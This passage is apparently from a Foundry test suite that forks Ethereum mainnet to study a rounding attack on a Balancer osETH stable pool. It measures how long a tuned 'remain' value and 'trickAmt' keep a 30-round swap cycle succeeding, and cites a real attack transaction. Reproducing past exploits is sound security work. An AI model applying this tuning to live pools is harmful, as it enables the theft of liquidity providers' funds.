        uint256 updatingCount = 0;
        uint256 feeDriftCount = 0;

        for (uint256 i = 0; i < 11; i++) {
            uint256 N = blockNums[i];

            vm.createSelectFork("ETH", N - SCAN);
            (uint256 ampLo, bool updLo,) = OSETH_BPT.getAmplificationParameter();
            uint256 feeLo = OSETH_BPT.getSwapFeePercentage();

            vm.createSelectFork("ETH", N);
            (uint256 ampMid, bool updMid,) = OSETH_BPT.getAmplificationParameter();
            uint256 feeMid = OSETH_BPT.getSwapFeePercentage();

            vm.createSelectFork("ETH", N + SCAN);
            (uint256 ampHi, bool updHi,) = OSETH_BPT.getAmplificationParameter();
            uint256 feeHi = OSETH_BPT.getSwapFeePercentage();

            console.log("=== block:", N);
            console.log("  amp @ N-400 :", ampLo);
            console.log("  amp @ N     :", ampMid);
            console.log("  amp @ N+400 :", ampHi);
            console.log("  isUpdating  : lo/mid/hi =");
            console.log("    ", updLo);
            console.log("    ", updMid);
            console.log("    ", updHi);
            console.log("  swapFee @ N-400 :", feeLo);
            console.log("  swapFee @ N     :", feeMid);
            console.log("  swapFee @ N+400 :", feeHi);

            if (ampLo != ampMid || ampMid != ampHi) {
                console.log("  *** AMP DRIFT in scan window ***");
                driftCount++;
            }
            if (updLo || updMid || updHi) {
                console.log("  *** AMP isUpdating==true at some boundary ***");
                updatingCount++;
            }
            if (feeLo != feeMid || feeMid != feeHi) {
                console.log("  *** SWAP FEE DRIFT in scan window ***");
                feeDriftCount++;
            }
        }

        console.log("");
        console.log("=== Summary across 11 blocks ===");
        console.log("  blocks with amp drift     :", driftCount);
        console.log("  blocks with isUpdating==t :", updatingCount);
        console.log("  blocks with fee drift     :", feeDriftCount);
    }

    /// @notice Helper for `test_cyclingIndependentOfPoolState`: run cycling with the
    /// given `sf1Value` (overrides sf[1] regardless of which fork we're on) and
    /// return how many of `ROUNDS` rounds passed before the first failure.
    function _cyclingRoundsAt(uint256 REMAIN, uint256 ROUNDS, uint256 sf1Value)
        internal returns (uint256 ok)
    {
        sf[1] = sf1Value;
        uint256 t = 1e18 / (sf[1] - 1e18);
        uint256 bw = REMAIN; uint256 bo = REMAIN;
        for (uint256 r = 0; r < ROUNDS; r++) {
            try this.simulateOneRound(bw, bo, t) returns (uint256 nW, uint256 nO) {
                bw = nW; bo = nO; ok++;
            } catch { return ok; }
        }
    }

    /// @notice Verify Phase 2 cycling is independent of real pool balances/BPT supply.
    /// Strategy:
    ///   1. Confirm realWETH / realOSETH / totalBPT differ between two blocks A and B.
    ///   2. Capture sf[1]_A at block A, run 30-round cycling -> trajectory_A.
    ///   3. Fork at B (different pool state), force sf[1] := sf[1]_A
    ///      (amp / swapFee already proven constant by `test_diag_ampAndFeeStability`),
    ///      run cycling with same REMAIN -> trajectory_B.
    ///   4. If trajectory_A == trajectory_B byte-for-byte AND a synthetic sf[1] sweep
    ///      yields identical pass/fail at A and B, cycling is provably independent of
    ///      real pool balances/BPT supply.
    function test_cyclingIndependentOfPoolState() public {
        uint256 BLOCK_A = 23717396;
        uint256 BLOCK_B = 23501400;
        uint256 REMAIN  = 67000;
        uint256 ROUNDS  = 30;

        // ----- Step 1: read pool state at A -----
        uint256 sf1_A; uint256 ampA; uint256 feeA;
        uint256 wA; uint256 oA; uint256 sA;
        {
            vm.createSelectFork("ETH", BLOCK_A);
            swapMath = new SwapMath(); _refreshAtCurrentFork();
            sf1_A = sf[1]; ampA = amp; feeA = swapFeePercentage;
            (, uint256[] memory bal,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
            wA = bal[0]; oA = bal[2]; sA = OSETH_BPT.getActualSupply();
        }

        // ----- Step 2: read pool state at B and verify it differs -----
        uint256 wB; uint256 oB; uint256 sB; uint256 sf1_B;
        {
            vm.createSelectFork("ETH", BLOCK_B);
            swapMath = new SwapMath(); _refreshAtCurrentFork();
            sf1_B = sf[1];
            (, uint256[] memory bal,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
            wB = bal[0]; oB = bal[2]; sB = OSETH_BPT.getActualSupply();
            require(amp == ampA, "amp differs between A and B");
            require(swapFeePercentage == feeA, "swapFee differs between A and B");
        }

        console.log("=== Pool state ===");
        console.log("Block A:", BLOCK_A);
        console.log("  realWETH :", wA);
        console.log("  realOSETH:", oA);
        console.log("  totalBPT :", sA);
        console.log("  sf[1]    :", sf1_A);
        console.log("Block B:", BLOCK_B);
        console.log("  realWETH :", wB);
        console.log("  realOSETH:", oB);
        console.log("  totalBPT :", sB);
        console.log("  sf[1]    :", sf1_B);
        require(wA != wB, "realWETH equal between blocks");
        require(oA != oB, "realOSETH equal between blocks");
        require(sA != sB, "totalBPT equal between blocks");
        console.log("OK: realWETH / realOSETH / totalBPT all differ between A and B");

        // ----- Step 3: trajectory at A with natural sf[1]_A -----
        uint256[31] memory bWa; uint256[31] memory bOa; uint256 okA;
        {
            vm.createSelectFork("ETH", BLOCK_A);
            swapMath = new SwapMath(); _refreshAtCurrentFork();
            require(sf[1] == sf1_A, "A sf[1] inconsistent");
            uint256 t = 1e18 / (sf[1] - 1e18);
            bWa[0] = REMAIN; bOa[0] = REMAIN;
            for (uint256 r = 0; r < ROUNDS; r++) {
                try this.simulateOneRound(bWa[r], bOa[r], t) returns (uint256 nW, uint256 nO) {
                    bWa[r+1] = nW; bOa[r+1] = nO; okA++;
                } catch { break; }
            }
        }

        // ----- Step 4: trajectory at B with sf[1] forced to sf1_A -----
        uint256[31] memory bWb; uint256[31] memory bOb; uint256 okB;
        {
            vm.createSelectFork("ETH", BLOCK_B);
            swapMath = new SwapMath(); _refreshAtCurrentFork();
            require(amp == ampA && swapFeePercentage == feeA, "B amp/fee drifted");
            sf[1] = sf1_A; // force equality with A
            uint256 t = 1e18 / (sf[1] - 1e18);
            bWb[0] = REMAIN; bOb[0] = REMAIN;
            for (uint256 r = 0; r < ROUNDS; r++) {
                try this.simulateOneRound(bWb[r], bOb[r], t) returns (uint256 nW, uint256 nO) {
                    bWb[r+1] = nW; bOb[r+1] = nO; okB++;
                } catch { break; }
            }
        }

        // ----- Step 5: compare trajectories byte-for-byte -----
        console.log("");
        console.log("=== Trajectory comparison (REMAIN=67000, sf[1] forced to sf1_A) ===");
        console.log("rounds passed at A:", okA);
        console.log("rounds passed at B:", okB);
        uint256 mismatches = 0;
        {
            uint256 maxR = okA > okB ? okA : okB;
            for (uint256 r = 0; r <= maxR; r++) {
                if (bWa[r] != bWb[r] || bOa[r] != bOb[r]) {
                    console.log("MISMATCH at round:", r);
                    console.log("  A.bW :", bWa[r]);
                    console.log("  B.bW :", bWb[r]);
                    console.log("  A.bO :", bOa[r]);
                    console.log("  B.bO :", bOb[r]);
                    mismatches++;
                }
            }
        }
        if (okA == okB && mismatches == 0) {
            console.log("PASS: trajectories byte-identical");
        } else {
            console.log("FAIL: trajectories differ");
        }

        // ----- Step 6: synthetic sf[1] sweep — verify pass/fail count is identical
        // for many sf[1] values whether we're on fork A or fork B. Uses a fixed delta
        // (~1e10 wei per "synthetic block", same order as the real osETH rate provider).
        uint256 LIMIT = 400;
        uint256 DELTA = 1e10;

        // sweep at A
        vm.createSelectFork("ETH", BLOCK_A);
        swapMath = new SwapMath(); _refreshAtCurrentFork();
        uint256 fwdA = LIMIT; uint256 fwdAR = ROUNDS;
        for (uint256 b = 1; b <= LIMIT; b++) {
            uint256 ok = _cyclingRoundsAt(REMAIN, ROUNDS, sf1_A + b * DELTA);
            if (ok < ROUNDS) { fwdA = b - 1; fwdAR = ok; break; }
        }
        uint256 bwdA = LIMIT; uint256 bwdAR = ROUNDS;
        for (uint256 b = 1; b <= LIMIT; b++) {
            uint256 ok = _cyclingRoundsAt(REMAIN, ROUNDS, sf1_A - b * DELTA);
            if (ok < ROUNDS) { bwdA = b - 1; bwdAR = ok; break; }
        }

        // sweep at B
        vm.createSelectFork("ETH", BLOCK_B);
        swapMath = new SwapMath(); _refreshAtCurrentFork();
        require(amp == ampA && swapFeePercentage == feeA, "B amp/fee drifted (sweep)");
        uint256 fwdB = LIMIT; uint256 fwdBR = ROUNDS;
        for (uint256 b = 1; b <= LIMIT; b++) {
            uint256 ok = _cyclingRoundsAt(REMAIN, ROUNDS, sf1_A + b * DELTA);
            if (ok < ROUNDS) { fwdB = b - 1; fwdBR = ok; break; }
        }
        uint256 bwdB = LIMIT; uint256 bwdBR = ROUNDS;
        for (uint256 b = 1; b <= LIMIT; b++) {
            uint256 ok = _cyclingRoundsAt(REMAIN, ROUNDS, sf1_A - b * DELTA);
            if (ok < ROUNDS) { bwdB = b - 1; bwdBR = ok; break; }
        }

        console.log("");
        console.log("=== Synthetic sf[1] sweep (DELTA=1e10 per step) ===");
        console.log("fwdSafe A:", fwdA, "fwdFailRounds:", fwdAR);
        console.log("fwdSafe B:", fwdB, "fwdFailRounds:", fwdBR);
        console.log("bwdSafe A:", bwdA, "bwdFailRounds:", bwdAR);
        console.log("bwdSafe B:", bwdB, "bwdFailRounds:", bwdBR);
        if (fwdA == fwdB && bwdA == bwdB && fwdAR == fwdBR && bwdAR == bwdBR) {
            console.log("PASS: synthetic sweep produced identical safeRun on A and B");
        } else {
            console.log("FAIL: sweep numbers differ");
        }
    }

    /// @notice Validate a single off-chain-tuned `remain` value's future safety window.
    /// Workflow it supports:
    ///   1. Off-chain optimization at head block N produced REMAIN = R*.
    ///   2. We want to know: for how many consecutive future blocks (N, N+1, ..., N+K)
    ///      will Phase 2 cycling with REMAIN = R* still pass all 30 rounds?
    /// Method:
    ///   - Re-fork at BLOCK_NUM (overrides setUp()'s vm.warp so block.timestamp = the
    ///     real on-chain ts of BLOCK_NUM; allows BLOCK_NUM to be parameterized freely).
    ///   - Refresh rate cache so sf[1] matches what the rate provider returns at that ts.
    ///   - b=0 baseline: run cycling at this sf[1].
    ///   - Forward scan: for b = 1..LIMIT, vm.warp(baseTs + b*12), refresh sf[1] from
    ///     the rate provider's natural linear extrapolation (same method used by the
    ///     real attack tx and by test_realForkSafeRunDistribution), then run cycling.
    ///   - Report fwdSafe (blocks) and the rounds achieved at the first failing block.
    /// Note: amp / swapFee assumed constant in the scan window
    /// (proven by test_diag_ampAndFeeStability for ranges relevant to this pool).
    function test_validateRemainFutureWindow() public {
        uint256 BLOCK_NUM = 23717396; // change this to any head block you computed REMAIN at
        uint256 REMAIN    = 67000;
        uint256 ROUNDS    = 30;
        uint256 LIMIT     = 400;

        // Re-fork to BLOCK_NUM so block.timestamp = the real on-chain ts of that block
        // (overrides whatever setUp() warped to). _refreshAtCurrentFork() then updates
        // the rate cache and re-reads amp / sf / swapFee at this fresh state.
        vm.createSelectFork("ETH", BLOCK_NUM);
        swapMath = new SwapMath();
        _refreshAtCurrentFork();

        uint256 baseTs = block.timestamp;

        // b=0 baseline at the head sf[1]
        uint256 trickAmt = 1e18 / (sf[1] - 1e18);
        uint256 bW = REMAIN; uint256 bO = REMAIN; uint256 baselineOk = 0;
        for (uint256 r = 0; r < ROUNDS; r++) {
            try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
                bW = nW; bO = nO; baselineOk++;
            } catch { break; }
        }
        console.log("=== validateRemainFutureWindow ===");
        console.log("BLOCK_NUM       :", BLOCK_NUM);
        console.log("REMAIN          :", REMAIN);
        console.log("baseTs          :", baseTs);
        console.log("base sf[1]      :", sf[1]);
        console.log("baseline rounds :", baselineOk);
        require(baselineOk == ROUNDS, "baseline does not pass 30 rounds");

        // Forward scan: b * 12s into the future (one block per step)
        uint256 firstFail = LIMIT + 1;
        uint256 ffRounds  = 0;
        uint256 ffSf1     = 0;
        for (uint256 b = 1; b <= LIMIT; b++) {
            try this.tryWarpToTsAndRefreshSf(baseTs + b * 12) {
                // ok
            } catch { firstFail = b; ffRounds = 0; ffSf1 = 0; break; }
            trickAmt = 1e18 / (sf[1] - 1e18);
            bW = REMAIN; bO = REMAIN; uint256 ok = 0;
            for (uint256 r = 0; r < ROUNDS; r++) {
                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
                    bW = nW; bO = nO; ok++;
                } catch { break; }
            }
            if (ok < ROUNDS) { firstFail = b; ffRounds = ok; ffSf1 = sf[1]; break; }
        }

        uint256 fwdSafe = firstFail - 1;
        console.log("");
        console.log("fwdSafe (blocks):", fwdSafe);
        console.log("fwdSafe (sec)   :", fwdSafe * 12);
        if (firstFail <= LIMIT) {
            console.log("first-fail block offset:", firstFail);
            console.log("first-fail rounds      :", ffRounds);
            console.log("first-fail sf[1]       :", ffSf1);
        } else {
            console.log("no failure within LIMIT blocks (= ", LIMIT, ")");
        }
    }

    /// @notice Map the FULL success/failure pattern of REMAIN over [N, N+LIMIT].
    /// Unlike `test_validateRemainFutureWindow`, this does NOT stop at first failure —
    /// it scans every block in the range and records pass/fail, so we can detect
    /// non-monotonic cycling behavior (e.g. fail then succeed again).
    /// Reports:
    ///   - First failing block offset
    ///   - Total #fails / #passes / longest contiguous fail run / longest contiguous
    ///     pass run after first fail (==> evidence of non-monotonicity)
    ///   - Per-segment summary [start..end] = PASS|FAIL
    function test_validateRemainFullScan() public {
        uint256 BLOCK_NUM = 23717396;
        uint256 REMAIN    = 67000;
        uint256 ROUNDS    = 30;
        uint256 LIMIT     = 400;

        vm.createSelectFork("ETH", BLOCK_NUM);
        swapMath = new SwapMath();
        _refreshAtCurrentFork();
        uint256 baseTs = block.timestamp;

        console.log("=== validateRemainFullScan ===");
        console.log("BLOCK_NUM       :", BLOCK_NUM);
        console.log("REMAIN          :", REMAIN);
        console.log("baseTs          :", baseTs);
        console.log("base sf[1]      :", sf[1]);

        // Baseline at b=0
        uint256 trickAmt0 = 1e18 / (sf[1] - 1e18);
        uint256 bW0 = REMAIN; uint256 bO0 = REMAIN; uint256 base0 = 0;
        for (uint256 r = 0; r < ROUNDS; r++) {
            try this.simulateOneRound(bW0, bO0, trickAmt0) returns (uint256 nW, uint256 nO) {
                bW0 = nW; bO0 = nO; base0++;
            } catch { break; }
        }
        require(base0 == ROUNDS, "baseline does not pass 30 rounds");

        // Full scan: do not break on failure
        bool[401] memory passes; // index 0 = baseline (always true here)
        passes[0] = true;
        uint256 totalPass = 1;
        uint256 totalFail = 0;
        uint256 firstFailB = 0; // 0 means "no fail observed"

        for (uint256 b = 1; b <= LIMIT; b++) {
            try this.tryWarpToTsAndRefreshSf(baseTs + b * 12) {
                // ok
            } catch {
                passes[b] = false;
                totalFail++;
                if (firstFailB == 0) firstFailB = b;
                continue;
            }
            uint256 trickAmt = 1e18 / (sf[1] - 1e18);
            uint256 bW = REMAIN; uint256 bO = REMAIN; uint256 ok = 0;
            for (uint256 r = 0; r < ROUNDS; r++) {
                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
                    bW = nW; bO = nO; ok++;
                } catch { break; }
            }
            if (ok == ROUNDS) {
                passes[b] = true;
                totalPass++;
            } else {
                passes[b] = false;
                totalFail++;
                if (firstFailB == 0) firstFailB = b;
            }
        }

        // Compress consecutive identical results into [start..end] segments
        console.log("");
        console.log("=== Segment map ===");
        uint256 segStart = 0;
        bool segPass = passes[0];
        uint256 segCount = 0;
        for (uint256 b = 1; b <= LIMIT; b++) {
            if (passes[b] != segPass) {
                _logSeg(segStart, b - 1, segPass);
                segCount++;
                segStart = b;
                segPass  = passes[b];
            }
        }
        _logSeg(segStart, LIMIT, segPass); // final segment
        segCount++;

        // Post-first-fail analysis: any later passes?
        uint256 postFailPasses = 0;
        if (firstFailB > 0) {
            for (uint256 b = firstFailB; b <= LIMIT; b++) {
                if (passes[b]) postFailPasses++;
            }
        }

        console.log("");
        console.log("=== Summary ===");
        console.log("first fail at b      :", firstFailB);
        console.log("total passes (b>=1)  :", totalPass - 1);
        console.log("total fails  (b>=1)  :", totalFail);
        console.log("segment count        :", segCount);
        console.log("passes AFTER firstFail:", postFailPasses);
        if (postFailPasses == 0) {
            console.log("CONCLUSION: monotonic - once failing, always failing within LIMIT");
        } else {
            console.log("CONCLUSION: NON-MONOTONIC - cycling resumes after firstFail");
        }
    }

    /// @dev Helper to print a [start..end] = PASS|FAIL segment line.
    function _logSeg(uint256 a, uint256 b, bool pass) internal pure {
        if (pass) {
            console.log("  PASS  [", a, "..", b);
        } else {
            console.log("  FAIL  [", a, "..", b);
        }
    }

    /// @notice Focused sweep: at a given block, test multiple `remain` values and
    /// measure baseline + fwdSafe + bwdSafe for each. Single fork, multiple inner loops.
    function test_block23501400_remainSweep() public {
        uint256 BLOCK_NUM = 23717396;
        uint256[1] memory remainSweep;
        remainSweep[0] = 94000;

        uint256 LIMIT  = 400;
        uint256 ROUNDS = 30;

        // Single real fork
        vm.createSelectFork("ETH", BLOCK_NUM);
        swapMath = new SwapMath();
        _refreshAtCurrentFork();
        uint256 baseTs = block.timestamp;
        uint256 baseSf1 = sf[1];
        console.log("=== block.number :", BLOCK_NUM);
        console.log("    baseTs       :", baseTs);
        console.log("    baseSf1      :", baseSf1);

        for (uint256 k = 0; k < remainSweep.length; k++) {
            uint256 REMAIN = remainSweep[k];
            // refresh at base timestamp before each sweep iteration
            _warpToTsAndRefreshSf(baseTs);
            uint256 trickAmt = 1e18 / (sf[1] - 1e18);

            // baseline
            uint256 bW = REMAIN; uint256 bO = REMAIN; uint256 ok0 = 0;
            for (uint256 r = 0; r < ROUNDS; r++) {
                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
                    bW = nW; bO = nO; ok0++;
                } catch { break; }
            }
            console.log("--- remain =", REMAIN, "---");
            console.log("    baseline rounds:", ok0);
            if (ok0 < ROUNDS) {
                console.log("    BASELINE_FAIL, skip scans");
                continue;
            }

            // forward scan
            uint256 firstFail = LIMIT + 1;
            uint256 ffRounds  = 0;
            for (uint256 b = 1; b <= LIMIT; b++) {
                try this.tryWarpToTsAndRefreshSf(baseTs + b * 12) {
                } catch { firstFail = b; ffRounds = 0; break; }
                trickAmt = 1e18 / (sf[1] - 1e18);
                bW = REMAIN; bO = REMAIN; uint256 ok = 0;
                for (uint256 r = 0; r < ROUNDS; r++) {
                    try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
                        bW = nW; bO = nO; ok++;
                    } catch { break; }
                }
                if (ok < ROUNDS) { firstFail = b; ffRounds = ok; break; }
            }
            uint256 fwdSafe = firstFail - 1;
            uint256 fwdFR   = ffRounds;

            // backward scan
            firstFail = LIMIT + 1;
            ffRounds  = 0;
            for (uint256 b = 1; b <= LIMIT; b++) {
                try this.tryWarpToTsAndRefreshSf(baseTs - b * 12) {
                } catch { firstFail = b; ffRounds = 0; break; }
                trickAmt = 1e18 / (sf[1] - 1e18);
                bW = REMAIN; bO = REMAIN; uint256 ok = 0;
                for (uint256 r = 0; r < ROUNDS; r++) {
                    try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
                        bW = nW; bO = nO; ok++;
                    } catch { break; }
                }
                if (ok < ROUNDS) { firstFail = b; ffRounds = ok; break; }
            }
            uint256 bwdSafe = firstFail - 1;
            uint256 bwdFR   = ffRounds;

            uint256 total = fwdSafe + bwdSafe + 1;
            console.log("    fwdSafe(blocks):", fwdSafe, "fwdFail rounds:", fwdFR);
            console.log("    bwdSafe(blocks):", bwdSafe, "bwdFail rounds:", bwdFR);
            console.log("    total safe (blocks):", total);
            console.log("    total safe (min)   :", total * 12 / 60);
        }
    }

    /// @dev Helper to keep test_realForkSafeRunDistribution under stack/line limits.
    function _printRealForkSummary(
        uint256[11] memory blockNums,
        uint256[11] memory remains,
        uint256[11] memory fwdSafe,
        uint256[11] memory bwdSafe,
        uint256[11] memory fwdFailRounds,
        uint256[11] memory bwdFailRounds,
        uint256[11] memory baseSf1,
        uint256[11] memory baseTimestamps,
        bool[11]    memory baselinePassed,
        uint256 LIMIT
    ) internal pure {
        console.log("");
        console.log("=== Per-N detail (fwd / bwd / total) ===");
        for (uint256 i = 0; i < 11; i++) {
            console.log("block.number   :", blockNums[i]);
            console.log("  remain       :", remains[i]);
            console.log("  baseTs       :", baseTimestamps[i]);
            console.log("  baseSf1      :", baseSf1[i]);
            if (!baselinePassed[i]) {
                console.log("  BASELINE_FAIL");
                continue;
            }
            // forward
            if (fwdSafe[i] >= LIMIT) {
                console.log("  fwdSafe(blocks): >=", LIMIT);
            } else {
                console.log("  fwdSafe(blocks):", fwdSafe[i]);
                console.log("  fwdFail rounds :", fwdFailRounds[i]);
            }
            // backward
            if (bwdSafe[i] >= LIMIT) {
                console.log("  bwdSafe(blocks): >=", LIMIT);
            } else {
                console.log("  bwdSafe(blocks):", bwdSafe[i]);
                console.log("  bwdFail rounds :", bwdFailRounds[i]);
            }
            // total
            uint256 total = fwdSafe[i] + bwdSafe[i] + 1; // +1 for N itself
            console.log("  total safe(blocks):", total);
            console.log("  total safe(min)   :", total * 12 / 60);
        }

        // aggregate
        uint256 minTotal = type(uint256).max;
        uint256 maxTotal = 0;
        uint256 sumTotal = 0;
        uint256 cnt = 0;
        for (uint256 i = 0; i < 11; i++) {
            if (!baselinePassed[i]) continue;
            uint256 v = fwdSafe[i] + bwdSafe[i] + 1;
            if (v < minTotal) minTotal = v;
            if (v > maxTotal) maxTotal = v;
            sumTotal += v;
            cnt++;
        }
        console.log("");
        console.log("=== Summary across passing baselines ===");
        console.log("baseline pass count   :", cnt);
        if (cnt > 0) {
            console.log("min totalSafe(blocks):", minTotal);
            console.log("max totalSafe(blocks):", maxTotal);
            console.log("avg totalSafe(blocks):", sumTotal / cnt);
            console.log("avg totalSafe(min)   :", (sumTotal / cnt) * 12 / 60);
        }
    }

    /// @notice Maximum continuous safe run starting at block N.
    /// 1. Fork ONCE at block N.
    /// 2. Confirm baseline (offset=0) passes 30 rounds.
    /// 3. Scan offset = 1, 2, 3, ... blocks (12s each); stop at first failing offset.
    /// 4. Report (lastSafeBlocks, firstFailBlocks).
    function test_epochMaxContinuousSafeRun() public {
        uint256 LIMIT_BLOCKS = 1800;    // up to 6h
        uint256 ROUNDS       = 30;
        uint256 REMAIN       = 67000;

        // single fork — all subsequent offsets are vm.warp + updateTokenRateCache
        _setupEpochOffset(0);
        uint256 trickAmt = 1e18 / (sf[1] - 1e18);
        uint256 bW = REMAIN; uint256 bO = REMAIN; uint256 ok0 = 0;
        for (uint256 r = 0; r < ROUNDS; r++) {
            try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
                bW = nW; bO = nO; ok0++;
            } catch { break; }
        }
        console.log("baseline N (offset=0) sf[osETH]:", sf[1]);
        console.log("baseline N rounds completed   :", ok0);
        require(ok0 == ROUNDS, "baseline N does NOT pass; cannot measure safe run");

        uint256 firstFailBlocks = type(uint256).max;
        for (uint256 b = 1; b <= LIMIT_BLOCKS; b++) {
            _warpAndRefreshSf(b);
            trickAmt = 1e18 / (sf[1] - 1e18);
            bW = REMAIN; bO = REMAIN; uint256 ok = 0;
            for (uint256 r = 0; r < ROUNDS; r++) {
                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
                    bW = nW; bO = nO; ok++;
                } catch { break; }
            }
            if (b % 50 == 0) {
                console.log("  scan +blocks:", b, "rounds:", ok);
            }
            if (ok < ROUNDS) {
                firstFailBlocks = b;
                console.log("FIRST FAIL at +blocks:", b);
                console.log("                +sec  :", b * 12);
                console.log("           sf[osETH]  :", sf[1]);
                console.log("           rounds done:", ok);
                break;
            }
        }

        if (firstFailBlocks == type(uint256).max) {
            console.log("=== RESULT ===");
            console.log("No failure within LIMIT (blocks):", LIMIT_BLOCKS);
            console.log("Max safe run >= (blocks):", LIMIT_BLOCKS);
        } else {
            uint256 lastSafe = firstFailBlocks - 1;
            console.log("=== RESULT ===");
            console.log("Max continuous safe run (blocks):", lastSafe);
            console.log("                          (sec):", lastSafe * 12);
            console.log("                          (min):", lastSafe * 12 / 60);
            console.log("First failing block offset      :", firstFailBlocks);
        }
    }

    /// @notice Fine-grained scan over a single 12h Keeper epoch starting at block N.
    /// For each offset (every 30 min = 150 blocks) within [N, N+12h], run cycling with
    /// remain=67000 / N=30 and record how many rounds Swap 3 successfully completes.
    /// Purpose: empirically test the universal claim
    /// "off-chain pass at block N ⇒ on-chain pass at every block in [N, N+12h]".
    function test_epochFineScan_12h() public {
        uint256 STEP_BLOCKS = 150;          // 30 min
        uint256 LAST_BLOCKS  = 3600;         // 12 h
        uint256 N_POINTS     = LAST_BLOCKS / STEP_BLOCKS + 1; // 25 points
        uint256 ROUNDS       = 30;
        uint256 REMAIN       = 67000;

        uint256 passCount = 0;
        uint256 failCount = 0;
        uint256 firstFailOffsetBlocks = type(uint256).max;

        console.log("=== 12h epoch fine scan (every 30 min, 25 checkpoints) ===");
        for (uint256 k = 0; k < N_POINTS; k++) {
            uint256 offsetBlocks = k * STEP_BLOCKS;
            _setupEpochOffset(offsetBlocks);
            uint256 trickAmt = 1e18 / (sf[1] - 1e18);

            uint256 bW = REMAIN;
            uint256 bO = REMAIN;
            uint256 rounds = 0;
            for (uint256 r = 0; r < ROUNDS; r++) {
                try this.simulateOneRound(bW, bO, trickAmt) returns (uint256 nW, uint256 nO) {
                    bW = nW; bO = nO; rounds++;
                } catch { break; }
            }

            uint256 minutesOffset = offsetBlocks * 12 / 60; // minutes since N
            console.log("  +min:", minutesOffset, "rounds:", rounds);
            if (rounds == ROUNDS) {
                passCount++;
            } else {
                failCount++;
                if (offsetBlocks < firstFailOffsetBlocks) firstFailOffsetBlocks = offsetBlocks;
            }
        }
        console.log("=== Summary ===");
        console.log("  pass:", passCount, "/", N_POINTS);
        console.log("  fail:", failCount);
        if (failCount > 0) {
            console.log("  first failing offset (blocks):", firstFailOffsetBlocks);
            console.log("  first failing offset (min)   :", firstFailOffsetBlocks * 12 / 60);
        }
    }
}

